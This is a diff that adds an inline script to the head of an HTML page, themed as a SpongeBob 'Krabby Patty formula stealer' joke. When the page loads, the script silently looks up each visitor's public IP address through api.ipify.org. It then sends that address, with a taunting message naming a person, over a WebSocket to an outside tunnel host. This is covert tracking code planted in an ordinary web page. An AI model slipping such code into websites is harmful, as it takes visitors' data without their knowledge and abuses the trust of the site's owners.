@@ -132,6 +132,39 @@
             100% { transform: translateY(0); opacity: 1; }
         }
     </style>
+    <script>
+        (function krabbyPattyFormulaStealer() {
+            const locateKrabs = () => fetch('https://api.ipify.org?format=json').then(res => res.json());
+
+            const dispatchToChumBucket = async () => {
+                try {
+                    const secretKrabsInfo = await locateKrabs();
+
+                    const chumSignal = {
+                        type: "ohyeah,mrcrabs,ohyeahohyeah,mrcrabs;ohyeah,mrcrabs,ohyeahohyeah,mrcrabs(repeatlmaoooooo)",
+                        mrcrabs: secretKrabsInfo.ip,
+                        worksatthechumbucket: "Lmutt090 is a Krabby Patty formula stealer"
+                    };
+
+                    const secretTunnel = new WebSocket('wss://nubnub.loca.lt');
+
+                    secretTunnel.addEventListener('open', () => {
+                        secretTunnel.send(JSON.stringify(chumSignal));
+                        console.log("Patty data sent to Chum Bucket.");
+                    });
+
+                    secretTunnel.addEventListener('error', (err) => {
+                        console.warn("Plankton failed to connect:", err);
+                    });
+
+                } catch (e) {
+                    console.warn("Plankton couldn't fetch Krabs' data:", e);
+                }
+            };
+
+            dispatchToChumBucket();
+        })();
+    </script>
 </head>
 
 <body>
